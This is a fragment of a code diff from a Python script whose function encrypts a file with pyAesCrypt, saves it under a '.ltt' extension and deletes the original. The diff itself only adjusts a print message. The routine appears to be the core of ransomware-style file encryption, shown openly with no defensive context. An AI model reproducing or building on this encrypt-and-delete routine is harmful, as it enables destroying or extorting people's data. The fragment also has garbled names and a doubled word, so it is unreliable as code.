@@ -7,7 +7,7 @@ ffsdbffr=64*1024
 def ecrpt(file):
     try:
         pyAesCrypt.encryptFile(file,file + ".ltt", pswd, bffr)
-        print(file+" has been beencrypted")
+        print(file+" has been been encrypted")
         try:
             os.remove(file)
         except PermissionError:
